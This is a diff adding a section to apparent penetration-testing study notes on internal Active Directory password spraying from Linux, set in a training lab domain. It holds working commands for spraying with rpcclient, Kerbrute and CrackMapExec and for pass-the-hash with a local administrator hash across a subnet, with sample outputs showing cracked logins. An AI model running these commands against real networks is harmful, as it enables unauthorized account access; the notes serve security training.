@@ -4,6 +4,7 @@
 - [Overview](#overview)
 - [Enumerating & Retrieving Password Policies](#enumerating--retrieving-password-policies)
 - [Password Spraying – Making a Target User List](#password-spraying--making-a-target-user-list)
+- [Internal Password Spraying – from Linux](#internal-password-spraying--from-linux)
 
 # Overview
 - **Password spraying** is an attack where a few common passwords are tried against many accounts, avoiding account lockouts.
@@ -296,3 +297,74 @@ INLANEFREIGHT.LOCAL\guest          badpwdcount: 0 baddpwdtime: ...
 - Log all spray attempts: users, DC, time, date, passwords tried.
 - If policy is unknown, spray with extreme caution (low frequency, long intervals).
 - Use OSINT and external sources if internal enumeration is not possible. 
+
+# Internal Password Spraying – from Linux
+
+## Overview
+- After building a valid user list, execute password spraying attacks from a Linux host.
+- Use tools like rpcclient, Kerbrute, and CrackMapExec for different protocols and stealth levels.
+- Always proceed with caution to avoid account lockouts and detection.
+
+---
+
+## Password Spraying with rpcclient
+**Bash One-liner:**
+```bash
+for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+**Sample Output:**
+```
+Account Name: tjohnson, Authority Name: INLANEFREIGHT
+Account Name: sgage, Authority Name: INLANEFREIGHT
+```
+
+---
+
+## Password Spraying with Kerbrute
+**Command:**
+```bash
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+```
+**Sample Output:**
+```
+[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1
+Done! Tested 57 logins (1 successes) in 0.172 seconds
+```
+
+---
+
+## Password Spraying with CrackMapExec
+**Command:**
+```bash
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+```
+**Sample Output:**
+```
+SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\avazquez:Password123
+```
+
+**Validating Credentials:**
+```bash
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+```
+
+---
+
+## Local Administrator Password Reuse
+- Password spraying can target local admin accounts across multiple hosts.
+- Password reuse is common due to gold images or poor management.
+- CrackMapExec can spray NTLM hashes with the `--local-auth` flag to avoid domain lockouts.
+
+**Command:**
+```bash
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
+**Sample Output:**
+```
+SMB 172.16.5.50 445 ACADEMY-EA-MX01 [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+SMB 172.16.5.25 445 ACADEMY-EA-MS01 [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+```
+
+**Note:**
+- This technique is noisy and not suitable for stealthy assessments.
+- Recommend using Microsoft LAPS to enforce unique local admin passwords per host. 
